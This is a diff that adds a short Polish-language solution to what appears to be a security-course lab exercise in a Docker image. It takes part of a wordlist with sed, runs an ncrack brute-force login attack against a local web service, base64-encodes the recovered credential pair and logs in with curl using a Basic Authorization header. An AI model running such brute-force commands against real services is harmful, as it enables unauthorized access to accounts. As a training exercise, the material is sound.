@@ -1,0 +1,14 @@
+mazurkatarzyna/bsk-book-p1-ch0-ex04:latest 
+
+-Wybieramy linie z przedziału 10-20 z pliku wordlist_pl i przekazujemy do new.txt, ponieważ oryginalny jest zbyt długi
+sed -n -e '10,20p' wordlist_pl.txt > new.txt
+
+-Robimy bruteforce dopasowania tych haseł i loginów, żeby zalogować się na stronę
+ncrack -U new.txt http://127.0.0.1:1104
+
+-Trzeba zahashować login i hasło w formacie login:pass w base64
+echo -n 1qaz2wsx:1234567890 | base64
+
+-Wysyłamy curlem zapytanie pod adres z określonymi nagłówkami, żeby się zalogować, nagłówki potrzebne trzeba najpierw sprawdzić na burp suite
+curl -X GET http://127.0.0.1:1104 -H Authorization: Basic MXFhejJ3c3g6MTIzNDU2Nzg5MA== -H Connection: close -H Host: 127.0.0.1:1104
+
